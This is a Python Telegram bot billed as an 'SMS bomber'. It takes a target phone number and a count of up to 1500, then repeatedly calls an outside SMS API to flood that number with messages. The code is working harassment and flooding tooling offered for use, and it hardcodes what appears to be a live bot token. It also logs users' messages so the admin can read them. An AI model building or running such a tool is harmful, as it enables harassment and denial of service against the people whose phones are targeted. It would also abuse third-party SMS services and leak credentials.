import logging
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    User,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
)
import requests
import asyncio
from datetime import datetime

# --- কনফিগারেশন ---
BOT_TOKEN = "8140160684:AAFSMefeZ4WziVGNgZ-XTD6ZlUFKZSBNzlg"
CHANNEL_ID = "@SPEED_X_OFFICIAL"
ADMIN_ID = 7224513731

SMS_API_URL = "https://kingboss.my.id/dj.php?phone="

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

TARGET_PHONE, AMOUNT = range(2)
user_usage = {}
DAILY_LIMIT = 2

message_log = {}

WELCOME_TEXT = (
    "🩸 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐏𝐄𝐄𝐃_𝐗 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 🩸\n\n"
    "🔥 𝐅𝐨𝐫 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐉𝐨𝐢𝐧 𝐎𝐮𝐫 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐚𝐧𝐝 𝐕𝐞𝐫𝐢𝐟𝐲 🔥\n\n"
    "⚠️ 𝐃𝐢𝐬𝐜𝐥𝐚𝐢𝐦𝐞𝐫: 𝐔𝐬𝐞 𝐰𝐢𝐭𝐡 𝐫𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐢𝐥𝐢𝐭𝐲! 𝐃𝐨 𝐧𝐨𝐭 𝐬𝐩𝐚𝐦."
)

HELP_TEXT = (
    "🩸 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔 🩸\n\n"
    "🚀 /target <number> - 𝐒𝐭𝐚𝐫𝐭 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛\n"
    "📊 /all - 𝐋𝐢𝐬𝐭 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬 (𝐀𝐝𝐦𝐢𝐧 𝐎𝐧𝐥𝐲)\n"
    "📄 /ck - 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐋𝐨𝐠 (𝐀𝐝𝐦𝐢𝐧 𝐎𝐧𝐥𝐲)\n"
    "ℹ️ /help - 𝐒𝐡𝐨𝐰 𝐭𝐡𝐢𝐬 𝐌𝐞𝐧𝐮\n\n"
    "🩸 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲 𝐒𝐏𝐄𝐄𝐃_𝐗 🩸"
)

def blood_style(text: str) -> str:
    result = ""
    for c in text:
        if 'A' <= c <= 'Z':
            result += chr(ord(c) + 0x1D400 - ord('A'))
        elif 'a' <= c <= 'z':
            result += chr(ord(c) + 0x1D41A - ord('a'))
        else:
            result += c
    return result

async def check_channel_member(user_id: int, application) -> bool:
    try:
        member = await application.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logger.error(f"Check member error: {e}")
        return False

def check_usage_limit(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    today = datetime.now().date()
    user_data = user_usage.get(user_id, {"count": 0, "last_used_date": today})
    if user_data["last_used_date"] != today:
        user_data["count"] = 0
        user_data["last_used_date"] = today
        user_usage[user_id] = user_data
    return user_data["count"] < DAILY_LIMIT

def increment_usage(user_id: int) -> None:
    today = datetime.now().date()
    user_data = user_usage.get(user_id, {"count": 0, "last_used_date": today})
    if user_data["last_used_date"] != today:
        user_data["count"] = 1
        user_data["last_used_date"] = today
    else:
        user_data["count"] += 1
    user_usage[user_id] = user_data
    logger.info(f"User {user_id} usage: {user_usage[user_id]['count']} times today.")

async def start(update: Update, context):
    user_id = update.effective_user.id
    is_member = await check_channel_member(user_id, context.application)

    message = update.effective_message

    if not is_member:
        keyboard = [
            [InlineKeyboardButton("🔗 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=f"https://t.me/{CHANNEL_ID.lstrip('@')}")],
            [InlineKeyboardButton("✅ 𝐕𝐞𝐫𝐢𝐟𝐲", callback_data="verify_member")]
        ]
        await message.reply_text(
            blood_style(WELCOME_TEXT),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await message.reply_text(
            blood_style("✅ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐕𝐞𝐫𝐢𝐟𝐢𝐞𝐝!\n\n") + blood_style(HELP_TEXT)
        )
async def verify_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    is_member = await check_channel_member(user_id, context.application)

    if is_member:
        await query.edit_message_text(
            blood_style("✅ 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥!\n\n") + blood_style(HELP_TEXT),
            parse_mode="Markdown"
        )
    else:
        keyboard = [
            [InlineKeyboardButton("🔗 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=f"https://t.me/{CHANNEL_ID.lstrip('@')}")],
            [InlineKeyboardButton("✅ 𝐕𝐞𝐫𝐢𝐟𝐲", callback_data="verify_member")]
        ]
        await query.edit_message_text(
            blood_style("⚠️ 𝐘𝐨𝐮 𝐇𝐚𝐯𝐞 𝐍𝐨𝐭 𝐉𝐨𝐢𝐧𝐞𝐝 𝐓𝐡𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐘𝐞𝐭.\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐉𝐨𝐢𝐧 𝐚𝐧𝐝 𝐓𝐫𝐲 𝐀𝐠𝐚𝐢𝐧."),
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

async def target_command(update: Update, context):
    user_id = update.effective_user.id
    is_member = await check_channel_member(user_id, context.application)

    message = update.effective_message

    if not is_member:
        keyboard = [
            [InlineKeyboardButton("🔗 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=f"https://t.me/{CHANNEL_ID.lstrip('@')}")],
            [InlineKeyboardButton("✅ 𝐕𝐞𝐫𝐢𝐟𝐲", callback_data="verify_member")]
        ]
        await message.reply_text(
            blood_style("⚠️ 𝐘𝐨𝐮 𝐌𝐮𝐬𝐭 𝐉𝐨𝐢𝐧 𝐚𝐧𝐝 𝐕𝐞𝐫𝐢𝐟𝐲 𝐅𝐢𝐫𝐬𝐭 𝐭𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝!"),
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    if not check_usage_limit(user_id):
        await message.reply_text(
            blood_style(f"❌ 𝐘𝐨𝐮 𝐇𝐚𝐯𝐞 𝐄𝐱𝐜𝐞𝐞𝐝𝐞𝐝 𝐓𝐡𝐞 𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭 {DAILY_LIMIT} 𝐭𝐢𝐦𝐞𝐬.")
        )
        return ConversationHandler.END

    args = context.args
    if not args or not args[0].startswith("01") or len(args[0]) != 11:
        await message.reply_text(
            blood_style("📱 𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐏𝐡𝐨𝐧𝐞 𝐍𝐮𝐦𝐛𝐞𝐫.\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: `/target 01xxxxxxxxx`"),
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    phone_number = args[0]
    context.user_data["target_phone"] = phone_number
    await message.reply_text(
        blood_style(f"𝐏𝐡𝐨𝐧𝐞 𝐍𝐮𝐦𝐛𝐞𝐫 𝐒𝐞𝐭 𝐭𝐨 `{phone_number}`.\n\n𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐒𝐌𝐒 𝐭𝐨 𝐬𝐞𝐧𝐝? (𝐌𝐚𝐱 1500)"),
        parse_mode="Markdown"
    )
    return AMOUNT

async def get_amount(update: Update, context):
    user_id = update.effective_user.id
    amount_str = update.message.text
    try:
        amount = int(amount_str)
        if not 1 <= amount <= 1500:
            await update.message.reply_text(blood_style("❌ 𝐀𝐦𝐨𝐮𝐧𝐭 𝐦𝐮𝐬𝐭 𝐛𝐞 1 𝐭𝐨 1500. 𝐓𝐫𝐲 𝐚𝐠𝐚𝐢𝐧."))
            return AMOUNT
    except ValueError:
        await update.message.reply_text(blood_style("❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫. 𝐓𝐫𝐲 𝐚𝐠𝐚𝐢𝐧."))
        return AMOUNT

    phone_number = context.user_data.get("target_phone")
    if not phone_number:
        await update.message.reply_text(blood_style("❌ 𝐍𝐨 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐟𝐨𝐮𝐧𝐝. 𝐔𝐬𝐞 /target 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐠𝐚𝐢𝐧."))
        return ConversationHandler.END

    increment_usage(user_id)

    await update.message.reply_text(blood_style(f"🚀 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐭𝐨 𝐬𝐞𝐧𝐝 {amount} 𝐒𝐌𝐒 𝐭𝐨 {phone_number}..."))

    status_message = await update.message.reply_text(blood_style("✅ 𝐒𝐞𝐧𝐭: 0 / 0"))

    await bomb_sms(phone_number, amount, status_message)

    return ConversationHandler.END



import aiohttp

async def bomb_sms(phone_number: str, amount: int, status_message):
    sent_count = 0

    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            try:
                async with session.get(f"{SMS_API_URL}{phone_number}") as response:
                    if response.status == 200:
                        sent_count += 1
                        text = await response.text()
                        logger.info(f"SMS sent to {phone_number}. Response: {text}")
                    else:
                        logger.warning(f"Failed to send SMS to {phone_number}. Status: {response.status}")

            except Exception as e:
                logger.error(f"Error sending SMS to {phone_number}: {e}")

            # প্রতি SMS এর পরে স্ট্যাটাস আপডেট
            if (i + 1) % 1 == 0 or (i + 1) == amount:
                try:
                    await status_message.edit_text(blood_style(f"✅ 𝐒𝐞𝐧𝐭: {sent_count} / {amount}"))
                except Exception as e:
                    logger.warning(f"Could not edit status message: {e}")

            await asyncio.sleep(0.5)

    await status_message.edit_text(blood_style(f"✅ 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝! 𝐓𝐨𝐭𝐚𝐥 𝐒𝐞𝐧𝐭: {sent_count} / {amount}"))

async def cancel(update: Update, context):
    await update.message.reply_text(blood_style("❌ 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝."))
    return ConversationHandler.END


async def help_command(update: Update, context):
    user_id = update.effective_user.id
    is_member = await check_channel_member(user_id, context.application)

    if not is_member:
        keyboard = [
            [InlineKeyboardButton("🔗 𝐉𝐨𝐢𝐧 𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url=f"https://t.me/{CHANNEL_ID.lstrip('@')}")],
            [InlineKeyboardButton("✅ 𝐕𝐞𝐫𝐢𝐟𝐲", callback_data="verify_member")]
        ]
        await update.message.reply_text(
            blood_style("⚠️ 𝐘𝐨𝐮 𝐌𝐮𝐬𝐭 𝐉𝐨𝐢𝐧 𝐚𝐧𝐝 𝐕𝐞𝐫𝐢𝐟𝐲 𝐅𝐢𝐫𝐬𝐭 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭."),
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return

    await update.message.reply_text(blood_style(HELP_TEXT))


async def all_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text(blood_style("❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝."))
        return

    users = user_usage.keys()
    if not users:
        await update.message.reply_text(blood_style("❌ 𝐍𝐨 𝐮𝐬𝐞𝐫 𝐝𝐚𝐭𝐚 𝐟𝐨𝐮𝐧𝐝."))
        return

    msg = "🩸 𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒 𝐈𝐍𝐅𝐎 🩸\n\n"
    for uid in users:
        try:
            user: User = await context.bot.get_chat(uid)
            name = user.full_name
            username = f"@{user.username}" if user.username else "No username"
            msg += (
                f"🆔 ID: `{uid}`\n"
                f"👤 Name: {name}\n"
                f"🔗 Username: {username}\n\n"
            )
        except Exception as e:
            msg += f"🆔 ID: `{uid}` - ⚠️ Could not fetch info\n\n"

    await update.message.reply_text(
        blood_style(msg),
        parse_mode="Markdown"
    )


async def ck_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text(blood_style("❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝."))
        return

    if not message_log:
        await update.message.reply_text(blood_style("❌ 𝐍𝐨 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐥𝐨𝐠𝐠𝐞𝐝 𝐲𝐞𝐭."))
        return

    msg = "🩸 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐋𝐎𝐆 🩸\n\n"
    for user_id, logs in message_log.items():
        for log in logs:
            msg += f"👤 User ID: `{user_id}`\n🕒 Time: {log['time']}\n📩 Message: {log['message']}\n\n"

    await update.message.reply_text(blood_style(msg), parse_mode="Markdown")


def log_message(update: Update):
    user_id = update.effective_user.id
    message_text = update.message.text if update.message else update.callback_query.data
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if user_id not in message_log:
        message_log[user_id] = []

    message_log[user_id].append({
        "time": time_str,
        "message": message_text,
    })

    if len(message_log[user_id]) > 50:
        message_log[user_id].pop(0)


async def message_handler(update: Update, context):
    # Log the message for admin view
    log_message(update)

    # You can respond or ignore user messages here
    await update.message.reply_text(
        blood_style("❌ 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 /help 𝐟𝐨𝐫 𝐚𝐬𝐬𝐢𝐬𝐭𝐚𝐧𝐜𝐞."),
        parse_mode="Markdown"
    )


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('target', target_command)],
        states={
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True,
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(verify_callback, pattern="verify_member"))
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("all", all_command))
    application.add_handler(CommandHandler("ck", ck_command))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    logger.info("Bot started...")
    application.run_polling()


if __name__ == "__main__":
    main()